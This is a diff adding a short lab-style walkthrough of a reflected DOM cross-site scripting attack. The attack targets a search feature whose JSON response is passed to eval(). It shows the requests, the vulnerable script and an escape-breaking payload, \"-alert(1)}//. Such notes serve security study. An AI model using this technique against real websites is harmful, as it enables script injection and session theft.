@@ -1,0 +1,44 @@
+
+[ WEB > XSS > REFLECTED DOM ]
+
+// send some user input, e.g., via search bar
+GET /?search=test123 HTTP/2
+
+// notice that a subsequent get request is made
+GET /search-results?search=test123 HTTP/2
+
+// note the following javascript appears to be used:
+<script src='/resources/js/searchResults.js'>
+
+// we notice the javascript uses ajax
+// and puts the json http response into an eval:
+// function search(path) {
+//   var xhr = new XMLHttpRequest();
+//   xhr.onreadystatechange = function() {
+//     if (this.readyState == 4 && this.status == 200) {
+//       eval('var searchResultsObj = ' + this.responseText);
+//       displaySearchResults(searchResultsObj);
+//     }
+//   }; ...
+
+// note that the json response from the original request
+// looks like this when searching for "test123"
+{"results":[],"searchTerm":"test123"}
+
+// so the eval looks like:
+eval('var searchResultsObj = ' + {"results":[],"searchTerm":"test123"});
+
+// let's attempt to inject.
+// we see that quotes are escaped using backslashes
+// e.g., test"123 yield:            {"results":[],"searchTerm":"test\"123"}
+// but if we test\"123 it yields:   {"results":[],"searchTerm":"test\\"123"}
+// in that case, the backslash is escaped, and the quote can be used to escape the string
+
+// alright, i think we're ready to inject a payload now...
+// we'll try: \"-alert(1)}//
+// \ to protect the quote, which breaks out of string,
+// - to concat the alert without being interpreted as a space (+)
+// with the final alert(1) payload
+// then, we close out the json object and comment out any remaining code for that line.
+\"-alert(1)}//
+
